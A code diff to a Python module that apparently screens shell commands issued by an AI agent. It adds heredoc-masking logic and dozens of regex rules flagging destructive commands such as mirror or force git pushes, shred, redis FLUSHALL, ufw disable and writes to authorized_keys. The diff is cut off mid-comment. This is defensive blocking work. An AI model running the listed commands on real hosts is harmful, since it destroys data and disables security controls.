@@ -47,6 +47,18 @@ _COMMAND_TAIL = r'(?:\s*(?:&&|\|\||;).*)?$'
 # shell word boundary (_COMMAND_TAIL let `echo x > .env extra` / `echo x > .env # note` slip past).
 # `#` is deliberately NOT a boundary: a glued `#` is part of the filename (`.env#backup`).
 _WRITE_TARGET_BOUNDARY = r'(?=[\s;&|<>"\']|$)'
+# One shell command segment: stops at `;`/`&`/`|`/newline so a token in a LATER segment cannot
+# contaminate the verdict (same bound the git push rules use).
+_SEGMENT_BOUND = r'[^;|&\n]*'
+# Packages whose removal/purge takes out security or infrastructure (ufw/iptables/fail2ban are the
+# host firewall; openssh-server is the only remote access path; postgresql* purge runs a postrm that
+# deletes the cluster data dir; docker.io/containerd take out every container's data plane; caddy/
+# nginx front the public services). Deliberately an explicit list, never a wildcard: `apt remove -y
+# python3-pip` (corpus X127) must stay clean.
+_APT_INFRA_PACKAGES = (
+    r'(?:caddy|nginx|openssh-server|openssh-client|postgresql(?:-\d+)?|docker\.io|docker-ce|'
+    r'containerd|ufw|iptables|nftables|fail2ban|redis-server|wireguard|openvpn|hermes-agent|gbrain)\b'
+)
 
 # ---- Hardline (unconditional) blocklist ---------------------------------------------------
 # Commands that NEVER run via the agent, regardless of --yolo, approvals.mode=off, or cron approve
@@ -163,6 +175,215 @@ def _mask_quoted_prose(command: str) -> str:
     )
 
 
+# ---- Heredoc bodies: stdin DATA, not code ---------------------------------------------------
+# A heredoc body is stdin DATA for the command that reads it: `cat <<EOF > doc.md` plus a documentation
+# body never executes that text, so a command-word rule firing on it is the same documentation-shaped
+# false positive the quoted-prose guard removes for string arguments.
+#
+# The guard is an ALLOWLIST of pure data consumers, never a list of executors. The set of programs that
+# can turn stdin into execution has no bound — schedulers that run the body later (`crontab -`, `at`,
+# `batch`), service managers (`systemd-run --pipe`), database clients with a shell escape (`sqlite3`
+# `.shell`, `psql` `\!`), shells, interpreters, indirection programs — so an executor deny-list fails
+# OPEN the moment it misses one class. The set of programs that can only consume stdin as bytes is
+# small and enumerable, so the guard asks the positive question instead: mask the body only when EVERY
+# program it can reach is on this list. Every other reader, and every reader the scan cannot identify
+# at all, keeps the body RAW, i.e. gated — gating a body that turns out to be data is a false positive
+# and recoverable, masking one that turns out to be code is a false negative.
+_HEREDOC_DATA_CONSUMERS = frozenset({
+    # Copiers and filters: bytes in, bytes out, to stdout or to a named file. None of them has an
+    # option, an operator or a sub-command that runs a program over the data. Programs that look like
+    # filters but do have one stay out: `sed` (`e`), `awk` (`system()`), `sort`
+    # (`--compress-program` pipes the data into a program), `less`/`more` (interactive shell escape),
+    # `xargs`/`find`/`tar` (run the data or a program named on the command line).
+    "cat", "tee", "dd", "head", "tail", "nl", "od", "xxd", "hexdump", "strings", "base64", "cksum",
+    "md5sum", "sha1sum", "sha256sum", "sha512sum", "wc", "uniq", "tr", "cut", "paste", "join",
+    "comm", "fold", "expand", "unexpand", "rev", "tac", "shuf", "column", "fmt", "pr", "split",
+    "csplit", "tsort", "numfmt", "diff", "cmp",
+    # Shell builtins that only write their arguments out.
+    "printf", "echo",
+})
+# Command-list separators. Everything between two of them shares the heredoc's stdin path, so a
+# `| bash` in the same list keeps the body raw. `|` is deliberately NOT one: a pipe CARRIES the body.
+_HEREDOC_LIST_SEPARATORS = ";\n&(){}"
+
+
+def _iter_heredoc_operators(command: str):
+    """Yield ``(operator_start, delimiter, quoted_delimiter)`` for every ``<<`` heredoc operator.
+
+    ``<<<`` here-strings and the second ``<`` of a longer run are not operators. The scan tracks
+    quotes, so a ``<<`` inside a substitution is not seen here; that body is then left raw, which is
+    the fail-safe direction.
+    """
+    for kind, i, _, quote in _scan_shell(command, subst="uq", comments=True):
+        if kind != "char" or quote is not None or command[i] != "<":
+            continue
+        if i and command[i - 1] == "<":
+            continue
+        if not command.startswith("<<", i) or command.startswith("<<<", i):
+            continue
+        start = i + 2
+        if command.startswith("-", start):  # `<<-EOF` strips leading tabs from the terminator line
+            start += 1
+        _, _, word = _read_shell_word(command, start)
+        delimiter = _strip_shell_word_syntax(word)
+        if delimiter:
+            yield (i, delimiter, delimiter != word)
+
+
+def _heredoc_body_span(command: str, body_start: int, delimiter: str) -> tuple[int, int]:
+    """Return ``(body_end, after_terminator)`` for the body starting at *body_start*.
+
+    The terminator is the first line that is exactly *delimiter* (leading tabs ignored, as ``<<-``
+    allows). When no such line exists the first standalone *delimiter* token ends the body instead:
+    ``_mask_quoted_newlines`` folds an unmatched quote in the body into a space and can pull the
+    terminator up into the previous line, and stopping at that token under-masks rather than
+    swallowing a real command written after the heredoc. With no token at all the heredoc is
+    unterminated, and the shell consumes the rest of the input as its body, so the remainder is body.
+    """
+    position = body_start
+    while position <= len(command):
+        newline = command.find("\n", position)
+        line = command[position:newline if newline >= 0 else len(command)]
+        if line.rstrip("\r").lstrip("\t") == delimiter:
+            return (position, len(command) if newline < 0 else newline + 1)
+        if newline < 0:
+            break
+        position = newline + 1
+    offset = body_start
+    while True:
+        hit = command.find(delimiter, offset)
+        if hit < 0:
+            return (len(command), len(command))
+        after = hit + len(delimiter)
+        if (hit == body_start or command[hit - 1].isspace()) and (after >= len(command) or command[after].isspace()):
+            return (hit, after)
+        offset = hit + 1
+
+
+def _iter_heredoc_bodies(command: str):
+    """Yield ``(body_start, body_end, quoted_delimiter, operator_start)`` for every heredoc body, in
+    the order the shell reads them.
+
+    A body starts on the line after the one that opened it; consecutive operators on one line consume
+    their bodies in operator order, each starting after the previous terminator. A ``<<`` inside a body
+    is data, not an operator — bash reads exactly one body per operator — so it is skipped.
+    """
+    last_body: tuple[int, int] | None = None
+    next_body_start = None
+    for operator_start, delimiter, quoted in _iter_heredoc_operators(command):
+        if last_body is not None and last_body[0] <= operator_start < last_body[1]:
+            continue
+        if next_body_start is None or operator_start >= next_body_start:
+            newline = command.find("\n", operator_start)
+            if newline < 0:
+                return
+            body_start = newline + 1
+        else:
+            body_start = next_body_start
+        body_end, next_body_start = _heredoc_body_span(command, body_start, delimiter)
+        if body_start == body_end:  # empty body: nothing to mask, and the next body starts after it
+            last_body = None
+            continue
+        last_body = (body_start, body_end)
+        yield (body_start, body_end, quoted, operator_start)
+
+
+def _heredoc_reader_names(command: str, operator_start: int, words) -> list[str]:
+    """Names of every program a heredoc body can reach from *operator_start*, wrappers removed.
+
+    *words* is the command-word span list for the whole command (computed once per call, not per
+    heredoc). The body travels down the pipeline, so the readers are the command word of the stage
+    holding the operator plus the command word of every stage after it (`cat <<EOF | bash` hands the
+    body to `bash`), and everything between two command-list separators shares that stdin path.
+    Pass-through wrappers (`sudo`, `env`, `nohup`, ...) are dropped: they inherit stdin for the program
+    they launch, so `sudo tee /etc/nginx/nginx.conf <<EOF` reads the body through `tee`.
+    """
+    list_start, list_end = 0, len(command)
+    pipes: list[int] = []
+    for kind, i, _, quote in _scan_shell(command, subst="uq", comments=True):
+        if kind != "char" or quote is not None:
+            continue
+        if command[i] in _HEREDOC_LIST_SEPARATORS:
+            if i < operator_start:
+                list_start, pipes = i + 1, []
+            else:
+                list_end = i
+                break
+        elif command[i] == "|" and list_start <= i < operator_start:
+            pipes.append(i)
+    stage_start = max(pipes, default=list_start - 1) + 1
+    return [
+        os.path.basename(_deobfuscate_shell_word_for_detection(word)).lower()
+        for word_start, _, word in words if stage_start <= word_start < list_end
+    ]
+
+
+def _heredoc_body_is_data(command: str, operator_start: int, words) -> bool:
+    """Whether every program a heredoc body can reach is a known pure data consumer.
+
+    Only a positive identification masks the body. An empty reader set -- a bare redirection, a command
+    position the word scan could not parse -- keeps the body raw, as does any name off the allowlist.
+    """
+    readers = [
+        name for name in _heredoc_reader_names(command, operator_start, words)
+        if name not in _COMMAND_WRAPPER_WORDS
+    ]
+    return bool(readers) and all(name in _HEREDOC_DATA_CONSUMERS for name in readers)
+
+
+def _heredoc_body_replacement(body: str, quoted_delimiter: bool) -> str:
+    """Return what the detection variant keeps of one heredoc body: nothing, except the command
+    substitutions the shell still expands inside an UNQUOTED-delimiter body — those really run.
+
+    The body is REMOVED rather than blanked in place. Blanking turns a whole body into one long
+    whitespace run, and the command-word patterns backtrack catastrophically over runs like that
+    (measured on this branch: 15.6 s for the 59 rules over a 3.4 KB body, minutes over 14 KB).
+    Only a body whose readers are ALL known pure data consumers (``_HEREDOC_DATA_CONSUMERS``) reaches
+    this function, so removing it cannot hide a runnable command. A QUOTED delimiter (`<<'EOF'`,
+    `<<"EOF"`, `<<\\EOF`) suppresses expansion, so nothing in that body survives at all.
+    """
+    if quoted_delimiter:
+        return ""
+    kept: list[str] = []
+    i, n = 0, len(body)
+    while i < n:
+        char = body[i]
+        if char == "\\" and i + 1 < n:  # an escaped char is literal text, not an expansion
+            i += 2
+            continue
+        close = None
+        if body.startswith("$(", i):
+            close = _scan_dollar_paren_end(body, i)
+        elif char == "`":
+            close = _scan_backtick_end(body, i)
+        if close is not None:
+            kept.append(body[i:close])
+            i = close
+            continue
+        i += 1
+    return "\n".join(kept)
+
+
+def _mask_heredoc_bodies(command: str) -> str:
+    """Drop heredoc BODY text for the command-word rules (detection-only).
+
+    Documentation written through a heredoc (`cat <<EOF > doc.md`, `tee runbook.md <<EOF`) is data
+    for the command that reads it, exactly like a quoted argument, so the command-word rules must not
+    fire on it. Only a body whose readers are ALL known pure data consumers is dropped (see
+    ``_HEREDOC_DATA_CONSUMERS``); every other reader keeps the body raw. The terminator line and
+    everything outside the body are untouched.
+    """
+    if "<<" not in command:
+        return command
+    words = list(_iter_shell_command_word_spans(command))
+    edits = [
+        (start, end, _heredoc_body_replacement(command[start:end], quoted))
+        for start, end, quoted, operator_start in _iter_heredoc_bodies(command)
+        if _heredoc_body_is_data(command, operator_start, words)
+    ]
+    return _splice(command, edits) if edits else command
+
+
 # ---- Sudo stdin guard: without SUDO_PASSWORD configured, an explicit "sudo -S" is the LLM piping
 # a guessed password via stdin (brute-force vector). Unconditional block.
 _SUDO_STDIN_RE = re.compile(r'(?:^|[;&|`\n]|&&|\|\||\$\()\s*sudo\s+-S\b', re.IGNORECASE)
@@ -206,6 +427,31 @@ def detect_hardline_command(command: str) -> tuple:
 
 
 # ---- Dangerous command patterns -----------------------------------------------------------
+# `git` accepts global options BEFORE the subcommand (`git -C DIR push`, `git -c k=v push --mirror`,
+# `git --git-dir=… push`). The old `\bgit\s+push\b` anchor let every global-option spelling bypass the
+# push rules — the incident's actual command was `git -C /srv/app push --mirror origin`.
+# The option group is bounded (fixed alternation, `-C` consumes exactly one argument) so it cannot
+# swallow an arbitrary word and revive cross-token FPs.
+_GIT_PUSH = (
+    r'\bgit\b(?:\s+(?:-C\s+\S+|-c\s+\S+|--git-dir(?:=\S+|\s+\S+)'
+    r'|--work-tree(?:=\S+|\s+\S+)|--namespace=\S+|--exec-path(?:=\S+|\s+\S+)))*\s+push\b'
+)
+# Same bounded global-option set as _GIT_PUSH, but placed AFTER `\bgit` so the regex-derived legacy
+# approval key (`p.split(r'\b')[1]`) stays UNIQUE per rule — `git…checkout`, `git…stash`, … — instead
+# of collapsing to the bare `git` key every push rule already shares (alias collision, see
+# _PATTERN_KEY_ALIASES). `-C`/`--git-dir`/`--work-tree`/`--exec-path` consume exactly one argument,
+# so the group cannot swallow an arbitrary word and revive cross-token false positives.
+_GIT_OPT = (
+    r'(?:\s+(?:-C\s+\S+|-c\s+\S+|--git-dir(?:=\S+|\s+\S+)'
+    r'|--work-tree(?:=\S+|\s+\S+)|--namespace=\S+|--exec-path(?:=\S+|\s+\S+)))*'
+)
+# Read-only spellings of a gated verb — the chain-wide criterion: no new or
+# touched rule may gate a pure lookup. The lookahead is anchored to the FIRST token after the
+# command word, so a flag further along the line buys no exemption (same shape as the
+# filter-repo rule). `--list` is included: swapoff/fuser take no `--list` ACTION, so it is only
+# ever an informational listing there, and a lookup is a lookup.
+_LOOKUP_FLAGS = r'(?!\s+(?:--help\b|-h\b|--version\b|--dry-run\b|--list\b))'
+
 DANGEROUS_PATTERNS = [
     (r'\brm\s+(-[^\s]*\s+)*/', "delete in root path"),
     (r'\brm\s+-[^\s]*r', "recursive delete"),
@@ -282,6 +528,30 @@ DANGEROUS_PATTERNS = [
     (rf'>\s*{_SYSTEM_CONFIG_PATH}', "overwrite system config"),
     (r'\bsystemctl\s+(-[^\s]+\s+)*(stop|restart|disable|mask)\b', "stop/restart system service"),
     (r'\bkill\s+-9\s+-1\b', "kill all processes"),
+    # `kill -9 1` (or any `kill -<sig> 1`) targets PID 1: killing init/systemd tears down every
+    # service on the host (X070). `kill -HUP $(cat pid)` (X075) has no bare `1` and stays clean.
+    (r'\bkill\s+-\w+\s+1\s*(?:;|&|$|\n)', "kill PID 1 (init)"),  # X070
+    # `ip link set <iface> down` takes a network interface offline — remote access included
+    # (X094). `ip -br a` (X099) and other read-only `ip` invocations don't carry `link … down`.
+    (r'\bip\b' + _SEGMENT_BOUND + r'\blink\b' + _SEGMENT_BOUND + r'\bset\b' + _SEGMENT_BOUND + r'\bdown\b',
+     "bring network interface down"),  # X094
+    # `systemctl isolate <target>` stops every unit not in the target; rescue/emergency targets
+    # drop all running services (X255). stop/restart/disable are gated by the rule above.
+    (r'\bsystemctl\s+(-[^\s]+\s+)*isolate\s+\S*(?:rescue|emergency)\S*',
+     "systemctl isolate/rescue (drops all running services)"),  # X255
+    # `swapoff -a` disables all swap — instant memory pressure/OOM on a busy host (X285).
+    # Lookup spellings stay clean per the chain-wide criterion (false-positive report):
+    # `swapoff --help/-h/--version/--dry-run/--list` only prints information (false-positive fix).
+    (r'\bswapoff\b' + _LOOKUP_FLAGS, "disable swap (swapoff)"),  # X285
+    # Writing to /proc/sysrq-trigger issues kernel emergency commands (crash, reboot, remount-ro)
+    # (X282). The target path is the signal; redirection/tee both land on it.
+    (r'\bsysrq-trigger\b', "write to sysrq-trigger (kernel emergency command)"),  # X282
+    # `ln -sf` over an /etc file replaces live system config (resolver, sudoers, sshd) with a
+    # symlink — silent service breakage or privilege redirection (X316). -s is required (a hard
+    # link to /etc files is already gated by overwrite rules when targeted); -f is what makes it
+    # silent replacement.
+    (rf'\bln\s+-[a-z]*f[a-z]*s[a-z]*\b|\bln\s+-[a-z]*s[a-z]*f[a-z]*\b' + _SEGMENT_BOUND + _SYSTEM_CONFIG_PATH,
+     "symlink over /etc file (ln -sf)"),  # X316
     (r'\bpkill\s+-9\b', "force kill processes"),
     # killall with SIGKILL (-9 / -KILL / -s KILL / -SIGKILL) and `killall -r <regex>` broad sweeps
     # that can wipe unrelated processes.
@@ -317,6 +587,14 @@ DANGEROUS_PATTERNS = [
     (rf'\becho\b[^|]*\|\s*\btr\b[^|]*\|\s*\b(?:{_SHELL_NAMES_RE})\b', "pipe tr-transformed output to shell (possible command obfuscation)"),
     (rf'\bopenssl\b.*\b(?:base64|enc)\b[^|]*\s+-[dD]\b[^|]*\|\s*\b(?:{_SHELL_NAMES_RE})\b',
      "pipe openssl-decoded content to shell (possible command obfuscation)"),
+    # SSH key implant (corpus X287): a write into an `authorized_keys` file adds a key that survives
+    # password rotation — the highest-value persistence primitive on a host. Must sit BEFORE the
+    # generic _SENSITIVE_WRITE_TARGET tee/redirection rules so this one file gets the honest reason;
+    # every other ~/.ssh/* write keeps "overwrite system file via redirection" (pinned by
+    # TestSensitiveRedirectPattern, which asserts only the verdict, and by the cp/mv/sed rules below,
+    # which carry no `>` or `tee` and so never reach this rule).
+    (r'>>?\s*[^;|&\n]*?\bauthorized_keys\b|\btee\b[^;|&\n]*?\bauthorized_keys\b',
+     "write to authorized_keys (SSH key injection)"),  # X287
     (rf'\btee\b.*["\']?{_SENSITIVE_WRITE_TARGET}', "overwrite system file via tee"),
     (rf'>>?\s*["\']?{_SENSITIVE_WRITE_TARGET}', "overwrite system file via redirection"),
     (rf'\btee\b.*["\']?{_PROJECT_SENSITIVE_WRITE_TARGET}["\']?{_WRITE_TARGET_BOUNDARY}', "overwrite project env/config via tee"),
@@ -362,6 +640,18 @@ DANGEROUS_PATTERNS = [
     (r'\bnohup\b.*gateway\s+run\b', "start gateway outside systemd (use 'systemctl --user restart hermes-gateway')"),
     # Self-termination protection: prevent agent from killing its own process
     (r'\b(pkill|killall)\b.*\b(hermes|gateway|cli\.py)\b', "kill hermes/gateway process (self-termination)"),
+    # killall BY NAME is a broad sweep of every process matching the name (X061 `killall node`
+    # takes down the whole gateway fleet). Placed AFTER the SIGKILL/-r and self-termination rules
+    # so their specific descs win; the operand class excludes flags, so informational `killall -l`
+    # / `-V` (no process-name operand) stay clean.
+    (r'\bkillall\s+(?:-[^\s]*\s+)*[^\s-][^\s]*', "kill processes by name (killall)"),  # X061
+    # fuser -k kills every process holding the file/socket (X065 `fuser -k 8787/tcp`); plain
+    # `fuser <file>` only reports PIDs and stays clean — the rule requires the -k/--kill flag.
+    # GNU combined short options cluster, so `-km`/`-mk`/`-k9`/`-kmv` carry the SAME kill action
+    # as `-k -m` (same "clustered flag" class as the `-q` miss). The
+    # flag class is `[a-z]*k` — no other fuser single-letter flag contains `k` (list is
+    # -a -i -k -l -m -M -n -s -u -v -x), so a k inside a cluster can only be kill.
+    (r'\bfuser\b' + _SEGMENT_BOUND + r'\s(?:-[a-z]*k|--kill\b)', "kill processes on file/socket (fuser -k)"),  # X065
     # Self-termination via kill + $(pgrep/pidof): the substitution is opaque to the name-based
     # pattern above, so catch the structural form.
     (r'\bkill\b.*\$\(\s*(pgrep|pidof)\b', "kill process via pgrep/pidof expansion (self-termination)"),
@@ -412,8 +702,43 @@ DANGEROUS_PATTERNS = [
     # --ha, --har): --hard is the only reset mode starting with "h", and `--help` is special-cased
     # by git before mode resolution.
     (r'\bgit\s+reset\s+--h(?:a(?:r(?:d)?)?)?\b', "git reset --hard (destroys uncommitted changes)"),
-    (r'\bgit\s+push\b.*--forc[a-z]*\b', "git force push (rewrites remote history)"),
-    (r'\bgit\s+push\b.*-f\b', "git force push short flag (rewrites remote history)"),
+    # Mirror push deletes/force-updates EVERY remote ref absent locally (corpus X304, harm
+    # layer "history"). Bounded to one command segment (`[^;|&\n]`) so an unrelated later command's
+    # token can't contaminate, and anchored on the `--mirr` FLAG SPELLING (with git's unambiguous
+    # long-option abbreviations) so a remote/branch NAMED `mirror` (`git push origin mirror-sync`)
+    # stays clean. _GIT_GLOBAL_OPTS closes the `git -C <dir> push …` bypass (the incident
+    # ran exactly this form; the pre-existing force rules were bypassable the same way).
+    (_GIT_PUSH + r'[^;|&\n]*?\s--mirr[a-z]*\b', "git mirror push (deletes/overwrites remote refs not present locally)"),
+    # `git push --prune` DELETES remote branches absent locally — same harm class as corpus X305
+    # (`git push origin --delete`). Anchored on the push subcommand so the harmless
+    # `git fetch --all --prune` (X044, label 0) is untouched.
+    (_GIT_PUSH + r'[^;|&\n]*?\s--prune\b', "git push prune (deletes remote refs absent locally)"),
+    # corpus X305 (gate-vs-allow decided: GATE — label 1, harm layer
+    # "history": deleting an unmerged remote branch leaves commits only on the author's
+    # disk; same harm class as --prune above). Covers all three delete spellings:
+    # --delete / -d flag, and the colon-prefixed refspec (`git push origin :branch`,
+    # `:refs/heads/b`) which is delete-by-refspec. Bounded to the push command segment;
+    # a NON-prefixed colon refspec (`main:main`, `HEAD:main`) is a plain update and does
+    # not match (the `:` must sit right after whitespace).
+    (_GIT_PUSH + r'[^;|&\n]*?\s(?:-d\b|--delete\b|:\S+)', "git push delete (removes a remote branch/ref)"),
+    # corpus X040: a LEADING `+` in a refspec is force-push semantics
+    # (`git push origin +main:main` == `--force main:main`). The `+` must sit immediately
+    # after whitespace (refspec PREFIX position); git forbids `+`-prefixed ref/tag names,
+    # so name-internal `+` (`v2.0+build`), a trailing `+` (`main+`), and a `+` in a LATER
+    # command segment (`&& echo +done`) do not match.
+    (_GIT_PUSH + r'[^;|&\n]*?\s\+\S+', "git push force via +refspec prefix (rewrites remote history)"),
+    # --force-with-lease is the SAFE force variant (refuses stale overwrite; corpus X056 tier
+    # contextual). It stays gated — never silently allowed — but gets its own honest reason so the
+    # legacy "rewrites remote history" verdict no longer misattributes it. Must precede the
+    # --force rules: detection returns the FIRST pattern match and `--force\b` matches inside
+    # `--force-with-lease` (hyphen is a word boundary).
+    (_GIT_PUSH + r'[^;|&\n]*?--force-with-lease\b', "git push with lease (safe force variant, still overwrites when lease holds)"),
+    # `.*` (DOTALL) used to cross `;`/`&&`/`|`, blocking a harmless `git push --dry-run … | sed
+    # 's/[0-9a-f]\{40\}/…/'` on an unrelated `-f` in a LATER segment. Same-segment bound fixes it;
+    # real force pushes (`git push -f … && echo done`) still match because -f sits in the push
+    # segment itself.
+    (_GIT_PUSH + r'[^;|&\n]*?--forc[a-z]*\b', "git force push (rewrites remote history)"),
+    (_GIT_PUSH + r'[^;|&\n]*?-f\b', "git force push short flag (rewrites remote history)"),
     (r'\bgit\s+clean\s+-[^\s]*f', "git clean with force (deletes untracked files)"),
     (r'\bgit\s+branch\s+-D\b', "git branch force delete"),
     # `-D` = `-d --force`; the long spellings are different tokens, so match delete+force in either order, bounded to
@@ -442,6 +767,249 @@ DANGEROUS_PATTERNS = [
     (_CMDPOS + r'yarn\s+' + _PKG_OPTS + r'(?:global\s+)?(?:uninstall|remove)\b', "package manager uninstall"),
     (_CMDPOS + r'pip(?:3)?\s+' + _PKG_OPTS + r'uninstall\b', "package manager uninstall"),
     (_CMDPOS + r'brew\s+' + _PKG_OPTS + r'(?:uninstall|remove|rm)\b', "package manager uninstall"),
+    # ── harm-layer "data" backlog (corpus, harm_layer=data) ──────────
+    # 28 false negatives whose harm is unrecoverable DATA loss (labeling rules R3/R9/R10/R13).
+    # Every rule is bounded to ONE command segment (`[^;|&\n]*`) so a token in a later `&&`/`|`
+    # segment cannot contaminate the verdict, and every rule was FP-measured against the corpus
+    # label-0 rows before landing (FP stays exactly the known 25 ids, no new id).
+    #
+    # Irreversible file destruction: `shred -u` overwrites then unlinks (forensic-unrecoverable);
+    # `wipefs -a` erases filesystem/partition signatures so the data becomes unaddressable.
+    (r'\bshred\b' + _SEGMENT_BOUND + r'\s(?:-u\b|--remove\b)', "shred --remove (irreversible file destruction)"),  # X007 X237
+    (r'\bwipefs\b' + _SEGMENT_BOUND + r'\s-a\b', "wipe filesystem signatures (wipefs)"),  # X236
+    # In-place truncation to zero: the file's own content is gone and no copy exists. The corpus
+    # label-0 boundaries are log rotation (`/var/log/…`, `*.log`: X017 X319) and a tracked doc
+    # (`*.md`: X252) — both exempted via a lookahead over the rest of the segment.
+    (r'\btruncate\b' + _SEGMENT_BOUND + r'\s-s\s+0\b(?![^;|&\n]*(?:/var/log/|\.log\b|\.md\b))',
+     "truncate file to zero (data destruction)"),  # X006 X210 X238
+    # Redis: FLUSHALL/FLUSHDB drop every key in the instance; `del` removes the named keys (X314
+    # pipelines a scan into `xargs redis-cli del`, so the rule anchors on the redis-cli segment
+    # rather than on the pipeline shape).
+    (r'\bredis-cli\b' + _SEGMENT_BOUND + r'\b(?:flushall|flushdb)\b', "redis data destruction (FLUSHALL/FLUSHDB/DEL)"),  # X163 X164
+    (r'\bredis-cli\b' + _SEGMENT_BOUND + r'\bdel\b', "redis data destruction (FLUSHALL/FLUSHDB/DEL)"),  # X314
+    # SQL: schema/column drops, whole-table overwrite with NULL, and a row DELETE. The bare
+    # `DELETE FROM` rule sits AFTER the pre-existing "DELETE without WHERE" rule so the narrower
+    # reason keeps precedence for the no-WHERE spelling; `DROP INDEX` (X182) and an UPDATE with a
+    # WHERE (X180) stay clean.
+    (r'\bDROP\s+SCHEMA\b', "SQL DROP SCHEMA"),  # X166
+    (r'\bALTER\s+TABLE\b' + _SEGMENT_BOUND + r'\bDROP\s+COLUMN\b', "SQL DROP COLUMN"),  # X168
+    (r'\bUPDATE\s+\w+\s+SET\b' + _SEGMENT_BOUND + r'=\s*NULL\b', "SQL UPDATE setting values to NULL"),  # X169
+    (r'\bUPDATE\s+\w+\s+SET\b(?![^;\n]*\bWHERE\b)', "SQL UPDATE without WHERE (whole-table overwrite)"),
+    # A row DELETE is unrecoverable (R3), but a bare SQL string is only DATA — the repo's own
+    # `test_delete_with_where_safe` pins `DELETE FROM users WHERE id = 1` as safe. Anchor the rule
+    # on a database CLIENT invocation, which is what actually runs the statement (X179 psql -c).
+    (r'\b(?:psql|pgcli|mysql|mariadb|sqlite3)\b' + _SEGMENT_BOUND + r'\bDELETE\s+FROM\b', "SQL DELETE (row deletion)"),  # X179
+    # PostgreSQL: `--clean` DROPs the existing objects before restoring (prod data replaced by an
+    # old snapshot); `pg_dropcluster` removes the cluster's data + config. `pg_restore -d scratch`
+    # (X183) is the label-0 boundary and carries no --clean, so it stays clean.
+    (r'\bpg_restore\b' + _SEGMENT_BOUND + r'\s--clean\b', "pg_restore --clean (drops existing database objects)"),  # X165
+    (r'\bpg_dropcluster\b', "drop PostgreSQL cluster (pg_dropcluster)"),  # X167
+    # Docker: volume rm/prune destroys persistent data (not rebuildable from the image);
+    # `system prune -a/--volumes` sweeps images AND volumes. Global flags before the verb are
+    # tolerated so a flag cannot slip the rule; bare `docker system prune` (X153) and a non-forced
+    # `docker rm` (X151) stay clean.
+    (r'\bdocker\s+(?:-{1,2}\S+(?:[=\s]\S+)?\s+)*volume\s+(?:rm|prune)\b', "docker volume rm/prune (destroys volume data)"),  # X137 X140
+    (r'\bdocker\s+(?:-{1,2}\S+(?:[=\s]\S+)?\s+)*system\s+prune\b' + _SEGMENT_BOUND + r'\s(?:-a\b|--all\b|--volumes\b)',
+     "docker system prune --all/--volumes (destroys images and volumes)"),  # X139
+    (r'\bdocker\s+(?:-{1,2}\S+(?:[=\s]\S+)?\s+)*rm\b' + _SEGMENT_BOUND + r'\s(?:-f\b|--force\b)', "docker rm --force (forced container removal)"),  # X133
+    (r'\bdocker\s+(?:-{1,2}\S+(?:[=\s]\S+)?\s+)*pause\b', "docker pause (suspends container)"),  # X157
+    # apt purge/remove of a security or infrastructure package: purge runs the postrm script, which
+    # deletes cluster data and config (R11). Installs (X320), `autoremove --purge -y` with no
+    # package operand (X128), and non-infra packages (X127) stay clean.
+    (_CMDPOS + r'\bapt(?:-get)?\s+(?:-{1,2}\S+(?:\s+[^-\s]\S*)?\s+)*(?:remove|purge|autoremove)\b'
+     + _SEGMENT_BOUND + r'\b' + _APT_INFRA_PACKAGES,
+     "apt remove/purge of security or infrastructure package"),  # X111 X113 X114 X115 X116 X130
+    # rsync --delete makes the destination match the source, so files present only at the
+    # destination are deleted: an empty or stale source wipes a backup or a live tree. A destination
+    # that names itself a MIRROR (`builds-mirror/`, X028) is the label-0 boundary — the exemption
+    # requires the `mirror` token to look like a PATH (a `/` earlier in the same token), so a bare
+    # `# mirror` comment cannot disable the rule, a `~/…-mirror/` spelling is exempt like its
+    # absolute twin, and a plain `rsync -av` (X241) never matches.
+    (r'\brsync\b' + _SEGMENT_BOUND + r'\s--delete\b(?![^;|&\n]*\s\S*/\S*mirror)',
+     "rsync --delete over live data tree (deletes files missing at source)"),  # X233 X247 X251
+    (r'\bcrontab\b' + _SEGMENT_BOUND + r'\s-r\b', "remove crontab (crontab -r)"),  # X261
+    # Redirect overwriting a backup: a bare `>` in command position truncates the file with no
+    # producer (X232), and `pg_dump > …-latest.dump` overwrites the rollback point (X184). A
+    # DATE-stamped dump (X172) creates a new file and stays clean.
+    (r'(?:^|[;&|\n])\s*>\s*["\']?' + _SEGMENT_BOUND + r'\.\b(?:dump|sql|bak|tar|tgz|gz)\b',
+     "empty redirect truncates backup dump file"),  # X232
+    (r'\bpg_dump\b' + _SEGMENT_BOUND + r'>\s*["\']?\S*(?:latest|current)\S*', "redirect overwrites latest backup file"),  # X184
+    # ssh-keygen -f onto a DEFAULT identity name overwrites the private key in place (R9); a new
+    # named key (X223 `deploy_2026`) stays clean.
+    (r'\bssh-keygen\b' + _SEGMENT_BOUND + r'\s-f\s+["\']?\S*id_(?:rsa|dsa|ecdsa|ed25519)\b',
+     "ssh-keygen overwrites default SSH identity key"),  # X227
+    (r'\bvault\s+(?:-{1,2}\S+(?:[=\s]\S+)?\s+)*kv\s+(?:-{1,2}\S+(?:[=\s]\S+)?\s+)*delete\b',
+     "delete Vault secret (vault kv delete)"),  # X212
+    # ── harm-layer "security" backlog (corpus, harm_layer=security) ────
+    # False negatives whose harm is a SECURITY-CONTROL loss: the host firewall or the brute-force
+    # guard disabled/punched open, credentials made group/world-readable, a privilege-escalation
+    # primitive planted (SUID bit, sudo group, uid-0 user, SSH key, plaintext credential store).
+    # Every rule is bounded to ONE command segment (`[^;|&\n]*`) so a token in a later `&&`/`|`
+    # segment cannot contaminate the verdict, and every rule was FP-measured against the corpus
+    # label-0 rows before landing (FP stays exactly the known 25 ids, no new id).
+    #
+    # ufw: `disable`/`reset` takes the host firewall down entirely (X087). The open-port rule is an
+    # explicit DATABASE/APP-service port list, never a wildcard, so the standard web ports stay
+    # clean: `ufw allow 443/tcp` (X098) and the source-restricted `ufw allow from 100.64.0.0/10 to
+    # any port 22 proto tcp` (X102) are label 0. `ufw delete allow 80/tcp` (X104) and `ufw reload`
+    # (X108) carry no matching verb/port pair.
+    (r'\bufw\b' + _SEGMENT_BOUND + r'\b(?:disable|reset)\b',
+     "disable firewall (ufw disable/reset)"),  # X087
+    (r'\bufw\b' + _SEGMENT_BOUND + r'\ballow\b' + _SEGMENT_BOUND + r'\b(?:5432|3306|6379|27017|9200|11211|5433|8080)\b',
+     "open database/app service port (ufw allow)"),  # X090 X103
+    # Residual: the two loosenings of the SAME family the port-list rule covers.
+    # `ufw default allow` flips the whole incoming/outgoing policy to permissive in one command —
+    # strictly broader than any single allow rule. The `from any` form needs `any` as the SOURCE
+    # (a word directly after `from`): X102's `ufw allow from 100.64.0.0/10 to any port 22` keeps
+    # `to any` as DESTINATION only and stays clean — the restricted-source boundary.
